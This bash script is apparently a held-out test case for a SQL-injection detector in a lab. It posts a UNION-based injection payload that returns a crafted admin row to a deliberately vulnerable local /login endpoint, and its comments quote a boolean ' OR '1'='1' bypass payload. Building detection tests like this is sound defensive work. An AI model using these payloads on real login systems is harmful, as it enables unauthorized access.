#!/bin/bash
# Held-out variant of S1 (SQL Injection Auth Bypass, T1190).
# Original: boolean injection  ' OR '1'='1' --
# Variant : UNION-based injection that returns a crafted admin row.
# The lab DB is PostgreSQL, so a MySQL-style SLEEP() blind payload (the W4
# design) would raise a SQL error and log result=failure, which the S1
# detector ignores. A UNION payload returns a row -> result=success, which
# is the condition the detector keys on. Same /login endpoint, same planted
# SQLi weakness, different injection technique.
echo "========================================="
echo "S1 held-out variant - UNION-based SQL injection"
echo "========================================="
BODY=$(cat <<'JSON'
{"username":"zzz' UNION SELECT 1,'admin','admin'-- -","password":"x"}
JSON
)
curl -s -X POST http://localhost:5000/login \
    -H "Content-Type: application/json" \
    --data "$BODY"
echo
echo "[done] UNION SQLi payload sent."
